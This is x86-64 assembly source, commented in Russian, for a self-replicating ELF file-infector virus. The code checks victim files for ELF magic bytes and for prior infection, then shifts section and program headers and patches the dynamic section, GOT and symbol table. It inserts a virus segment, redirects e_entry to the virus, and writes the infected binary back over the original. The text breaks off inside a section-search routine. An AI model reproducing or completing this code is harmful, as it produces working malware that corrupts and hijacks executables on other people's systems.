/// PARAMS
/// RDI - start вируса
/// RSI - адрес таблицы заголовков секций жертвы
/// RDX - базовый адрес жертвы в памяти
/// RCX - количество заголовков
/// Проверяет, является ли открытый файл зараженным
/// - проверяем каждый загружаемый сегмент
/// - берем его смещение, считаем адрес его кода
///   в памяти
/// - сравнивам первый 32 байта по этому адресу со
///   start вируса
/// - если совпали - файл заражен, вернуть 0
/// - иначе проверить все сегменты, если нигде не совпало,
/// вернуть 1
_check_file_infection:
    push    %rbx
    push    %r8

_check_file_infection_cycle:

    push    %rcx
    mov     SHDR_SH_TYPE(%rsi), %rbx

    // секция SHT_PROGBITS?
    cmp     $0x1, %bl
    jne     _next_segm


    mov     SHDR_SH_OFFSET(%rsi), %rbx
    mov     $0x4, %rcx

    // адрес сегмента в памяти
    add     %rdx, %rbx

_check_segm_infection_cycle:
    movq    (%rdi), %rax
    movq    (%rbx), %r8

    cmp     %rax,  %r8
    jne     _next_segm

    add     $0x8, %rdi
    add     $0x8, %rbx

    loop    _check_segm_infection_cycle
    jmp     _infected

_next_segm:
    pop     %rcx
    add     $0x40, %rsi
    loop    _check_file_infection_cycle

    jmp     _clear
_infected:
    pop     %rcx
    mov     $0x0, %rax
    jmp     _check_file_infection_exit

_clear:
    mov     $0x1, %rax

_check_file_infection_exit:
    pop     %r8
    pop     %rbx

    ret

/// IS_IT_ELF
/// PARAMS
/// RDI - указатель на заголовок эльфа
/// Проверяет наличие магических байт в
/// загруженном эльфе
/// Если магические байты есть, то
/// возвращает 1 в RAX
/// В противном случае - 0
magic_bytes_example:
    .quad 0x10102464c457f

_is_it_elf:
    push    %rdx
    push    %rbx
    push    %rsi
    push    %rcx

    movq    (%rdi), %rdx
    mov     magic_bytes_example(%rip), %rsi

    cmp     %rsi, %rdx

    jne     _is_it_elf_fail
_is_it_elf_success:
    mov     $0x1, %rax
    jmp     _is_it_elf_exit

_is_it_elf_fail:
    xor     %rax, %rax

_is_it_elf_exit:
    pop     %rcx
    pop     %rsi
    pop     %rbx
    pop     %rdx

    ret

/// _GET_VICTIM_DATA
/// @PARAMS
/// - no
///
/// Высчитывает и заполняет переменные:
/// - адрес начала эльфа в памяти
/// записывается в victim_elf_add
/// - адрес теблицы заголовков программ
///   в victim_phdr_table_addr
/// - количество заголовов программ
///   в victim_phdr_amount
/// - сколько места они занимают все вместе
///   в victim_phdr_table_size
/// - адрес теблицы заголовков секций
///   в victim_shdr_table_addr
/// - количество заголовов  секций
///   в victim_shdr_amount
/// - сколько места они занимают все вместе
///   в victim_shdr_table_size
/// - адрес начала кода жертвы
///   в victim_code_before_infect_point_addr
_get_victim_data:
   	push    %rax
	push    %rbx
	push    %rcx
	push    %rdx
    push    %rsi

_get_victim_file_name:
    call    _get_file_name

    // указатель на имя файла
    lea     file_name_ptr(%rip), %rbx
    mov     %rax, (%rbx)

    mov     %rax, %rdi

    call    _my_strlen

_print_file_name:
    lea      file_name_len(%rip), %rdi
    mov      %rax, (%rdi)
    mov      file_name_ptr(%rip), %rdi

    mov      file_name_len(%rip), %rdx
    mov      file_name_ptr(%rip), %rsi
    call    _my_write

    lea     _msg_cur_infection(%rip), %rsi
    mov     $22, %rdx
    call    _my_write

    mov      file_name_ptr(%rip), %rdi
    // имя пустое?
    cmp     $0, (%rdi)
    // да - файлы кончились,
    // выходим
    je      _end_infector

_open_victim_file:
    mov      file_name_ptr(%rip), %rdi
    mov     $O_RDWR, %rsi
    call    _openfile

    test    %rax, %rax
    jle     _get_victim_file_name

    leaq    victim_elf_addr(%rip), %rsi
    mov     %rax, (%rsi)    # save elf victim addr

    // Проверяем, эльф ли это
    mov     %rax, %rdi
    call    _is_it_elf

    // если в rax 0, то это не
    // эльф
    test    %rax, %rax
    je      _get_victim_file_name

_save_victim_addr:
    // NB!: Зачем нужно сначала брать адрес, а потом
    // записывать по нему, что мешает сразу записать?
    mov     victim_elf_addr(%rip), %rdi

    mov     %rdi, %rsi      # elf victim addr
    mov     %rdi, %rax

_get_phdrs_info:
    // посчитать адрес, количество и сколько места
    // занимает таблица заголовков сегментов
    mov     ELF_E_PHOFF(%rdi), %rcx
    add     %rcx, %rsi      # phdr table addr 0x7ffff7ff7040

    leaq    victim_phdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)    # save phdr table addr

    mov     %rax, %rdi      # phdr amount
    mov     ELF_E_PHNUM(%rdi), %ecx
    movzwl  %cx, %ecx

    leaq    victim_phdr_amount(%rip), %rdx
    mov     %rcx, (%rdx)    # save phdr table amount

    mov     $0x38, %rdx
    imul    %rcx,  %rdx     # phrd table size

    leaq    victim_phdr_table_size(%rip), %rcx
    mov     %rdx, (%rcx)    # save phrd table size

_get_shdrs_info:
    // посчитать адрес, количество и сколько места
    // занимает таблица заголовков секций
    mov     %rax, %rdi
    mov     %rax, %rsi

    mov     ELF_E_SHOFF(%rdi), %rcx
    add     %rcx, %rsi      # shdr table addr 0x7ffff7ff89e0

    leaq    victim_shdr_table_addr(%rip), %rdx
    mov     %rsi, (%rdx)

    mov     %rax, %rdi
    mov     ELF_E_SHNUM(%rdi), %ecx  # shdr amount
    movzwl  %cx, %ecx

    leaq    victim_shdr_amount(%rip), %rdx # save shdr amount
    mov     %rcx, (%rdx)

    mov     $0x40, %rdx
    imul     %rcx,  %rdx    # shdr table size

    leaq    victim_shdr_table_size(%rip), %rcx  # save shdr table size
    mov     %rdx, (%rcx)

    // ищем первый сегмент кода
_find_first_segm:
    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rsi

    call    _find_first_seg_vaddr

    // проверяем, инфицирован ли файл
_is_file_infected:
    mov     victim_elf_addr(%rip), %rdx
    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_amount(%rip), %rcx
    leaq    _start(%rip), %rdi

    call    _check_file_infection

    test    %rax, %rax
    je      _get_victim_file_name

_get_dynamic_info:
    // узнаем, есть ли у файла секция dynamic
    mov     victim_shdr_table_addr(%rip), %rdi
    mov     victim_shdr_amount(%rip), %rsi

    call    _find_dynamic

    // если dynamic есть, то имеется ли в ней запись BIND_NOW
    // от этого будут зависеть дальнейшие вычисления
    mov    dynamic_records_offset(%rip), %rdx
    test   %rdx, %rdx
    je     _get_victim_whole_code_size

    mov    victim_elf_addr(%rip), %rdi
    add    %rdx, %rdi

    mov   dynamic_records_size(%rip),%rsi
    call   _find_bind_now_record

    // запись BIND_NOW нашли?
    mov   bind_now_record_exist(%rip), %rsi
    test  %rsi, %rsi
    // да, она там уже есть
    jne   _get_victim_whole_code_size

    // узнает размер кода жертвы от таблицы
    // заголовков сегментов до вставляемой
    // записи BIND_NOW и от вставляемой записи до
    // таблицы заголовков секций
_get_victim_code_size_with_new_bind_now_record:

    mov     victim_phdr_table_size(%rip), %rcx
    leaq    victim_code_offset(%rip), %rdx
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)   # save victim begin code offset

    mov     victim_phdr_table_addr(%rip), %rdx
    add     %rdx, %rcx      # victim begin code addr

    leaq    victim_code_before_bind_now_addr(%rip), %rdx
    mov     %rcx, (%rdx)    # save vicimt begin addr

    // это нужно для совместимостью с некоторыми частями кода,
    // где используется переменная  victim_code_addr
    leaq    victim_code_addr(%rip), %rdx
    mov     %rcx, (%rdx)

    mov     dynamic_records_offset(%rip), %rdi
    mov     new_bind_now_record_frm_dynamic_offset(%rip), %rsi
    add     %rdi, %rsi

    mov     victim_elf_addr(%rip), %rdx
    add     %rsi, %rdx

    leaq    victim_code_after_bind_now_addr(%rip), %rsi
    mov     %rdx, (%rsi)   # save victim addr after new rec

    sub     %rcx, %rdx

    leaq    victim_code_before_bind_now_size(%rip), %rsi
    mov     %rdx, (%rsi)    # save size

    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdx

    sub     %rsi, %rdx

    leaq    victim_code_after_bind_now_size(%rip), %rsi
    mov     %rdx, (%rsi)

    jmp     _get_victim_data_exit

    // узнает размер всего кода жертвы
    // используется в случае, если жертва собрана без
    // либ и у нее нет секции dynamic, либо она уже собрана с
    // флагом BIND_NOW - в обоих этих случаях никакой код внутри жертвы
    // вставлять не надо, а потому можно будет записать его в
    // перезаписываемый эльф одним вызовом
_get_victim_whole_code_size:
    // посчитать размер всего кода жертвы
    mov     victim_phdr_table_size(%rip), %rcx

    leaq    victim_code_offset(%rip), %rdx  # save victim code offset
    mov     %rcx, (%rdx)
    add     $0x40, (%rdx)
    mov     victim_phdr_table_addr(%rip), %rdx

    add     %rdx, %rcx    # 0x7ffff7ff7238

    leaq    victim_code_addr(%rip), %rdx  # save victim code addr
    mov     %rcx, (%rdx)

    mov     victim_shdr_table_addr(%rip), %rdx

    sub     %rcx, %rdx

    leaq    victim_code_size(%rip), %rcx  # save victim code size
    mov     %rdx, (%rcx)

_get_victim_data_exit:
    pop     %rsi
	pop     %rdx
	pop     %rcx
	pop     %rbx
    pop     %rax

    ret

/// _PRINT_VICTIM_DATA_fn
/// @PARAMS - no
/// Печатает значени переменных:
/// - victim_elf_addr
/// - victim_phdr_table_addr
/// - victim_phdr_amount
/// - victim_phdr_table_size
/// - victim_shdr_table_addr
/// - victim_shdr_amount
/// - victim_shdr_table_size
/// - victim_code_before_infect_point_size
/// - victim_code_after_infect_point_addr
/// - victim_code_after_infect_point_size
// _print_victim_data_fn:
//     PRINT_STR print_victim_data1 "-------------------- \n"
//     PRINT_STR print_victim_data2 "PRINT_VICTIM_DATA \n \n"

//     PRINT_STR victim_elf_addr "victim_elf_addr val: "
//     CNVRT_NUM victim_elf_addr

//     PRINT_STR victim_phdr_table_addr "victim_phdr_table_addr val: "
//     CNVRT_NUM victim_phdr_table_addr

//     PRINT_STR victim_phdr_amount "victim_phdr_amount val: "
//     CNVRT_NUM victim_phdr_amount

//     PRINT_STR victim_phdr_table_size "victim_phdr_table_size val: "
//     CNVRT_NUM victim_phdr_table_size

//     PRINT_STR victim_shdr_table_addr "victim_shdr_table_add  val: "
//     CNVRT_NUM victim_shdr_table_addr

//     PRINT_STR victim_shdr_amount "victim_shdr_amount val: "
//     CNVRT_NUM victim_shdr_amount

//     PRINT_STR victim_shdr_table_sz "victim_shdr_table_size val: "
//     CNVRT_NUM victim_shdr_table_size

//     PRINT_STR victim_code_b_inf_point_sz "victim_code_before_infect_point_size val: "
//     CNVRT_NUM victim_code_before_infect_point_size

//     PRINT_STR victim_code_a_inf_pnt_addr "victim_code_before_infect_point_addr val: "
//     CNVRT_NUM victim_code_after_infect_point_addr

//     PRINT_STR victim_code_a_infect_point_sz "victim_code_before_infect_point_size val: "
//     CNVRT_NUM victim_code_after_infect_point_size

//     PRINT_STR print_victim_end "--------------------\n"

//     ret

// Печатает данные вируса: адрес его кода в памяти и размер этого кода
// _print_virus_data_fn:

//     PRINT_STR print_virus_data1 "--------------------\n"
//     PRINT_STR print_virus_data2 "PRINT_VIRUS_DATA \n \n"

//     PRINT_STR  virus_code_addr "virus_code_addr val: "
//     CNVRT_NUM  virus_code_addr

//     PRINT_STR  virus_code_size "virus_code_size val: "
//     CNVRT_NUM  virus_code_size

//     PRINT_STR print_virus_end "-------------------- \n"

//     ret

phdr_field_ptr:
    .quad 0

_print_virus_new_phdr_fn:

    push    %rax
    push    %rbx
    push    %rcx

    PRINT_STR  virus_phdr1 "-------------------- \n"

    leaq    virus_new_phdr(%rip), %rax

    leaq    phdr_field_ptr(%rip), %rbx

    movl     (%rax), %ecx
    mov      %ecx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x4, %rax

    movl     (%rax), %ecx
    mov      %ecx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x4, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr


    pop      %rax
    add     $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add     $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    push     %rax
    CNVRT_NUM  phdr_field_ptr

    pop      %rax
    add      $0x8, %rax

    mov     (%rax), %rcx
    mov      %rcx, (%rbx)
    CNVRT_NUM  phdr_field_ptr


    PRINT_STR  virus_phdr2 "-------------------- \n"

    pop    %rcx
    pop    %rbx
    pop    %rax

    ret

/// NB!: Пусть комменты к процедурам будут без отступа
/// FIND_POINT_FOR_INFECTION
/// Ищет точку заражения в жертве:
/// - считает виртульный адрес, на котором находятся
/// заголовки секций
/// находит заголовок секции text
/// и сохраняет его индекс (понадобится для заголовка
/// секции вируса)
_find_point_for_infection:

    push    %rdx
    push    %rdi
    push    %rsi

    //  узнаем, где первая секция text жертвы
    //  она нужна для того, чтоб сослаться на ее
    // индекс в таблице строк
    mov     victim_elf_addr(%rip), %rdi
    mov     ELF_E_ENTRY(%rdi), %rdx

    mov     victim_shdr_table_addr(%rip), %rdi

    mov     victim_shdr_amount(%rip), %rsi

    call    _find_victim_text_section

    // находим конец последнего сегмента
    mov     victim_phdr_table_addr(%rip), %rdi
    mov     victim_phdr_amount(%rip), %rsi

    call    _find_last_seg_vaddr

    pop  %rsi
    pop  %rdi
    pop  %rdx

    ret

/// RECOUNT
/// PARAMS - no
/// Редактирует поля всех shdr и phdr, которые
/// описывают код, находящийся НИЖЕ точки заражения -
/// весь код должен сместиться на размер вируса вниз
/// по файлу
/// Редактирует поля заголовков заражаемого сегмента и
/// заражаемой секции, содержащие в себе размер
/// описываемого кода - вирус пишется после последней
/// секции в заражаемом сегменте, т.е. сегмент
/// расширяется, как и последняя секция
/// Редактирует поле e_shoff в заголовке эльфа - т.е.
/// смещение до заголовков секций: они сместятся
/// на размер вируса
_recount:
    push    %rax
    push    %rbx
    push    %rdx
    push    %rcx
    push    %rdi
    push    %rsi

_recount_symtab:
    // редактируем записи в таблице символов

    mov     victim_shdr_amount(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdi

    call    _find_symtab

    mov     symtab_shdr_addr(%rip), %rdi
    mov     symtab_records_amount(%rip), %rsi
    mov     $0x38, %rdx

    call    _recount_symbols_addrs

_count_victim_code_begin_vaddr:
    // находим начальный ВИРТУАЛЬНЫЙ адрес кода жертвы
    // т.е. который находится сразу за заголовками программ
    mov    victim_code_offset(%rip), %rdx

    mov    first_seg_vaddr(%rip), %rdi
    add    %rdx, %rdi

    leaq   victim_code_frm_begin_vaddr(%rip), %rsi
    mov    %rdi, (%rsi)

_recount_hdrs:
    //  увеличить поля sh_offset и sh_addr
    //  всех shdr, находящихся после точки заражения
    // - vaddr end заражаемого сегмента -
    // на размер кода вируса,
    // а так же отредактировать записи в секция
    // relа и сохранить
    // размер и смещение секции dynamic,
    // чтоб ее можно было редктировать позже

    mov     victim_shdr_amount(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdi
    mov     $0x38, %rdx

    call    _shdr_offset_and_addr_recount

    // изменить поля p_offset, p_vaddr, p_paddr
    // во всех phdr, которые описывают
    // на сегменты, находящиеся после таблицы заголовков
    mov     victim_phdr_amount(%rip), %rsi
    mov     victim_phdr_table_addr(%rip), %rdi
    mov     $0x38, %rdx

    call    _phdr_offset_and_addr_recount
_edit_got_and_dynamic:
    // подготовить params и отредактировать
    // записи в секции dynamic
    mov     dynamic_records_offset(%rip), %rax

    // секция dynamic найдена?
    cmp     $0, %rax
    // нет, пропустить редактирование dynamic и
    // got, жертва собрана без либ
    je      _generate_virus_hdrs

    mov     victim_elf_addr(%rip), %rdi
    add     %rax, %rdi  # dynamic sect addr

    mov     $0x38, %rsi
    mov     dynamic_records_size(%rip), %rdx

    // в секции dynamic некоторые поля содержат не адреса,
    // а размер (например, кол-во записей rela и т.д.)
    // их легко спутать с адрсами, хотя редактировать не надо
    // поэтому мы будем редактировать только те поля,
    // содердимое которых больше, чем
    // чем виртуальный адрес, с которого начинается
    // код жертвы
    mov     victim_code_frm_begin_vaddr(%rip), %rcx

    call    _recount_dynamic_section

    // редактируем записи внутри GOT
    mov     victim_shdr_amount(%rip), %rsi
    mov     victim_shdr_table_addr(%rip), %rdi
    mov     GOT_vaddr(%rip), %rdx

    call    _edit_got_records

_generate_virus_hdrs:
    // сгененрировать заголовки для
    // кода вируса
    call    _count_virus_new_vaddr

    call    _generate_virus_phdr

    call    _generate_virus_shdr

    // запсиь BIND_NOW уже существует в секции
    // dynamic жертвы?
    mov     bind_now_record_exist(%rip), %rax
    cmp     $0x1, %rax
    je      _edit_elf_header

    // нет, генерируем новую
    call    _generate_bind_now_flag_record

_edit_elf_header:
    mov     virus_code_size(%rip), %rsi
    mov     data_size(%rip), %rdi
    mov     new_bind_now_flag_record_size(%rip), %rdx

    add     %rdi, %rsi # + размер блока данных
    add     $0x38, %rsi # + размер вставляемого заголовка
    add     %rdx, %rsi # + размер вставляемой записи dynamic

_change_e_entry:
    mov     victim_elf_addr(%rip), %rdi
    add     $0x18, %rdi     # смещение до e_entry

    leaq    original_e_entry(%rip), %rbx
    mov     (%rdi), %rcx
    mov     %rcx, (%rbx)  # save original e_entry

    mov     virus_new_vaddr(%rip), %rdx
    mov     %rdx, (%rdi) # new e_entry

_change_shoff_phnum_shnum:
    add     $0x10, %rdi   # смещение до e_shoff
    add     %rsi, (%rdi)

    add     $0x10, %rdi   # смещение до e_phnum
    add     $0x1, (%rdi)

    add     $0x4, %rdi   # смещение до e_shnum
    add     $0x1, (%rdi)

_count_offsets:
    // считаем, на каком адресе будем находиться
    // в жертве, когда будем передавать
    // ей же управление
    mov     virus_code_size(%rip), %rax
    dec     %rax

    mov     virus_new_vaddr(%rip), %rbx

    add     %rbx, %rax
    mov     %rax, %rdi

    call    _count_offset_to_orig_e_entry  # offset for jmp
    call    _count_offset_to_move_victim

    // считаем смещение от начала файла до оригинального
    // e_entry
    leaq    offset_to_e_entry_frm_file_begin(%rip), %rdi

    mov     first_seg_vaddr(%rip), %rsi
    mov     original_e_entry(%rip), %rdx
    sub     %rsi, %rdx
    mov     %rdx, (%rdi)

    // считаем смещение от нового e_entry
    // до оригинального
    leaq    frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rdi
    mov     virus_new_vaddr(%rip), %rcx
    mov     original_e_entry(%rip), %rdx
    sub     %rdx, %rcx
    mov     %rcx, (%rdi)

    // считаем смещение от наала файла до кода
    // жертвы (т.е. тот код, что сразу идет после
    // таблицы заголовков сегментов)
    leaq    offset_to_vict_code_frm_file_begin(%rip), %rdi
    mov     victim_elf_addr(%rip), %rcx

    mov     victim_code_addr(%rip), %rdx
    sub     %rcx, %rdx
    mov     %rdx, (%rdi)

_make_opcode_blocks:
    // создаем код для передачи управления жертве
    call    _transfer_control_to_victim

    // заполняем блок данных жертвы
    call    _make_victim_data_block

    pop     %rsi
    pop     %rdi
    pop     %rcx
    pop     %rdx
    pop     %rbx
    pop     %rax

    ret

// считает смещение до оригинльного e_entry,
// чтоб его мог использовать jmp, который передаст
// управление жертве после того,
// как вирус в ней отработает
/// PARAMS -
/// RDI - виртуальный адрес, от которого считаем
/// смещение
// Возвращает смещение в RAX
_count_offset_to_orig_e_entry:
    push   %rbx
    push   %rax
    push   %rcx

    mov    %rdi, %rax
    mov    original_e_entry(%rip), %rbx

    // после исполнения вируса новая запись в dynamic
    // будет затерта, поэтому считаем смещение так,
    // как-будто ее нет
    mov    new_bind_now_flag_record_size(%rip), %rcx
    sub    %rcx, %rdi
    // посчитали смещение,
    // должно быть отрицательным, поскольку
    // оригинальный e_entry всегда будет выше
    // _exit_victim
    sub    %rax, %rbx

    leaq   offset_to_e_entry(%rip), %rax
    movl   %ebx, (%rax)

    pop    %rcx
    pop    %rax
    pop    %rbx
    ret

/// _COUNT_OFFSET_TO_MOVE_VICTIM
/// считает смещение до функции move_victim
_count_offset_to_move_victim:
    push   %rbx
    push   %rax

    leaq   _move_victim(%rip), %rbx
    leaq   _exit_victim(%rip), %rax
    add    $0x5, %rax  # пропустили будущую команду jmp

    sub    %rax, %rbx

    leaq   move_victim_offset(%rip), %rax
    movl   %ebx, (%rax)

    pop    %rax
    pop    %rbx
    ret


/// _MAKE_VICTIM_DATA_BLOCK
data_size:
    .quad 0x50

data_block:
    .space 0x50, 0
/// Заполняет блок данными жертвы, которые будут
/// использоваться во время исполнения вируса
/// внутри зараженной жертвы, чтоб сдвинуть
/// ее на прежние адреса в памяти
_make_victim_data_block:
    push   %rbx
    push   %rax
    push   %rcx

    leaq   data_block(%rip), %rax

    mov    dynamic_records_vaddr(%rip), %rbx

    test   %rbx, %rbx
    je     _no_vaddr_edit_needed

    add    $0x38, %rbx

_no_vaddr_edit_needed:
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    dynamic_records_size(%rip), %rbx
    mov    new_bind_now_flag_record_size(%rip), %rcx
    add    %rcx, %rbx

    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    first_seg_vaddr(%rip), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    virus_new_vaddr(%rip), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    victim_code_size(%rip), %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    offset_to_e_entry_frm_file_begin(%rip), %rbx
    add    $0x38, %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    original_e_entry(%rip), %rbx
    add    $0x38, %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    frm_orig_e_entry_to_virus_e_entry_offset(%rip), %rbx
    sub    $0x38, %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    offset_to_vict_code_frm_file_begin(%rip), %rbx
    add    $0x38, %rbx
    movq   %rbx, (%rax)
    add    $0x8, %rax

    mov    new_bind_now_flag_record_size(%rip), %rbx
    movq   %rbx, (%rax)

    pop    %rcx
    pop    %rax
    pop    %rbx
    ret

 // _TRANSFER_CONTROL_TO_VICTIM
transfer_control_code_size:
    .quad  0xB

transfer_control_code:
    .space  0xB, 0

_transfer_control_to_victim:
    push    %rax
    push    %rbx

    lea     transfer_control_code(%rip), %rax
    mov     $0xe8, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    // offset
    mov     move_victim_offset(%rip), %rbx
    mov     %ebx, (%rax)
    add     $0x4, %rax

    mov     $0xe9, %rbx
    movzwl  %bx, %ebx

    // call opcode
    movb    %bl, (%rax)
    inc     %rax

    mov     offset_to_e_entry(%rip), %rbx
    mov     %ebx, (%rax)
    add     $0x4, %rax

    // nop opcode
    mov     $0x90, %rbx
    movzwl  %bx, %ebx
    movb    %bl, (%rax)

    pop     %rbx
    pop     %rax
    ret

/// _RECOMBINE_ELF
/// Вписывает вирус и код жертвы в заданный файл
/// PARAMS - no
_recombine_elf:
    // открываем/создаем промежуточный файл
    lea     new_elf_file(%rip), %rdi
    // RDWR + O_CREAT
    mov     $0x42, %rsi
    // разрешение на rwx
    mov     $0x1ff, %rdx
    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    // victim_file fd
    mov      fd(%rip), %rbx

    leaq    fd(%rip), %rdx
    mov     %rax, (%rdx)   # save fd

_write_till_phdr_table_end:
    // записать файл жертвы от начала до
    // конца  таблицы заголовков
    mov     victim_elf_addr(%rip), %rsi
    mov     fd(%rip), %rdi

    mov     victim_phdr_table_size(%rip), %rdx
    add     $0x40, %rdx

    mov     %rdx,  %r8

    xor     %rcx, %rcx
    mov     %rcx, %r10
    # в rcx можно указать смещение, откуда начать запись
    # но если файл открыт на o_append,
    # этот аргумент игнорируется
    mov     $0x12, %rax   # syscall pwrite
    syscall

_write_new_phdr_virus:
    // записать новый заголовок сегмента вируса
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     $0x38, %rdx
    add     %rdx, %r8

    mov     fd(%rip), %rdi
    leaq    virus_new_phdr(%rip), %rsi

    mov     $0x12, %rax   # syscall pwrite
    syscall

    // вставляем доп. запись dynamic?
    mov    new_bind_now_record_exist(%rip), %rdx
    test   %rdx, %rdx
    je     _write_whole_victim

    // вставка записи bind_now в жертву
    // и записьжертвы в файл
_insert_bind_now_record:
    // вписываем жертву от начала до
    // точки, куда вставим запись
    // BIND_NOW
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     victim_code_before_bind_now_addr(%rip), %rsi
    mov     victim_code_before_bind_now_size(%rip), %rdx

    add     %rdx, %r8
    mov     fd(%rip), %rdi
    mov     $0x12, %rax   # syscall pwrite
    syscall

    // вписываем запись BIND_NOW
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    bind_now_flag_record(%rip), %rsi
    mov     new_bind_now_flag_record_size(%rip), %rdx

    add     %rdx, %r8

    mov     fd(%rip), %rdi
    mov     $0x12, %rax   # syscall pwrite
    syscall

    // вписываем жертву от точки, куда вставили
    // запись BIND_NOW, до конца
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     victim_code_after_bind_now_addr(%rip), %rsi
    mov     victim_code_after_bind_now_size(%rip), %rdx

    add     %rdx, %r8

    mov     fd(%rip), %rdi
    mov     $0x12, %rax   # syscall pwrite
    syscall

    jmp    _write_virus_code

_write_whole_victim:
    // записать код жертвы
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     fd(%rip), %rdi

    mov     victim_code_addr(%rip), %rsi # 0xf7ff7238
    mov     victim_code_size(%rip), %rdx # 0x17a8

    add     %rdx, %r8

    mov     $0x12, %rax   # syscall pwrite
    syscall

_write_virus_code:
    // записать в файл код вируса
    // записываем без послежних 11 байт -
    // в них будет передача управления на жертву
    // будут записано отдельно
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     fd(%rip), %rdi

    mov     virus_code_addr(%rip), %rsi
    mov     virus_code_size(%rip), %rdx

    mov     transfer_control_code_size(%rip), %rax
    sub     %rax, %rdx
    add     %rdx, %r8

    mov     $0x12, %rax   # syscall pwrite
    syscall

    // вписать передачу управления на жертву
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    transfer_control_code(%rip), %rsi

    mov     transfer_control_code_size(%rip), %rdx
    add     %rdx, %r8

    mov     fd(%rip), %rdi

    mov     $0x12, %rax      # syscall pwrite
    syscall

    // вписать данные жертвы
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    data_block(%rip), %rsi
    mov     data_size(%rip), %rdx

    add     %rdx, %r8

    mov     fd(%rip), %rdi

    mov     $0x12, %rax      # syscall pwrite
    syscall

_write_victim_shdrs:
    // записать в файл заголовки секций жертвы
    mov     %r8, %rcx
    mov     %rcx, %r10

    mov     victim_shdr_table_addr(%rip), %rsi
    mov     victim_shdr_table_size(%rip), %rdx

    add     %rdx, %r8

    mov     $0x12, %rax      # syscall pwrite
    syscall

_write_virus_new_shdr:
    // вписать заголовок секции вируса
    mov     %r8, %rcx
    mov     %rcx, %r10

    leaq    virus_new_shdr(%rip), %rsi
    mov     $0x40, %rdx
    add     %rdx, %r8

    mov     fd(%rip), %rdi

    mov     $0x12, %rax      # syscall pwrite
    syscall

_close_file:
    mov     fd(%rip), %rdi
    mov     $0x3, %rax      # syscall close
    syscall

    // пробуем переписать из
    // test_inf в файл жертвы
    mov     $O_RDWR, %rsi
    lea     new_elf_file(%rip), %rdi

    call    _openfile

    test    %rax, %rax
    je      _end_infector

    mov     %r8, %rdx
    xor     %rcx, %rcx
    xor     %r10, %r10

    mov     %rbx, %rdi
    mov     %rax, %rsi

    mov     $0x12, %rax      # syscall pwrite
    syscall

    mov     $0x3, %rax      # syscall close
    syscall

    mov     file_name_ptr(%rip), %rsi
    mov     file_name_len(%rip), %rdx
    call    _my_write

    leaq    _msg_infection_success(%rip), %rsi
    mov     $0x1b, %rdx
    // mov     $len_msg_infection_success, %rdx

    call    _my_write

    ret


// _EDIT_RELA_SECTION
// Подготавливает параметры и вызывает редактирование секции rela
// PARAMS
// RDI - адрес на заголовок секции rela
_edit_rela_section:
    push  %rdi
    push  %rsi
    push  %rdx
    push  %rcx

    mov   %rdx, %rsi    # const

    add   $0x14, %rdi
    mov   (%rdi), %rcx   # sh_offset

    add   $0x8, %rdi
    mov   (%rdi), %rdx   # sh_size

    mov   %rcx, %rdi     # sh_offset

    call  _recount_rela_section

    pop   %rcx
    pop   %rdx
    pop   %rsi
    pop   %rdi

    ret

/// _RECOUNT_GOT_SECTION
/// редактирует записи - адреса
/// - внутри GOT, увеличивая их на
/// на заданную величину
/// RDI - offset до секции got
/// RSI - значение, на которое увеличивается vaddr
/// RDX - размер секции got
_recount_got_section:
    push    %rax
    push    %rcx

    // посчитали кол-во записей
    // в секции got
    mov     %edx, %eax
    xor     %rdx, %rdx
    mov     $0x8, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    //  получили адрес кода секции в памяти
    mov     victim_elf_addr(%rip), %rax
    add     %rdi, %rax

_recount_got_section_cycle:
    cmp     $0, (%rax)
    je      _recount_got_next_iter

    // vaddr записи + константа
    add     %rsi, (%rax)

_recount_got_next_iter:
    add     $0x8, %rax   # сдвиг на след. запись
    loop    _recount_got_section_cycle

_recount_got_section_exit:
    pop     %rcx
    pop     %rax

    ret

/// _FIND_DYNAMIC
/// PARAMS
/// RDI - указатель на таблицу заголовков секций
/// RSI - их количество
/// Ищет заголовок секции dynamic
/// Если находит, то заполняет данные о секции
_find_dynamic:
    push    %rcx
    push    %rdx

    mov     %rsi, %rcx
_find_dynamic_cycle:

    mov     SHDR_SH_TYPE(%rdi), %rdx
    cmp     $0x6, %dl   # shdr = dynamic?
    je      _find_dynamic_success

    add     $0x40, %rdi
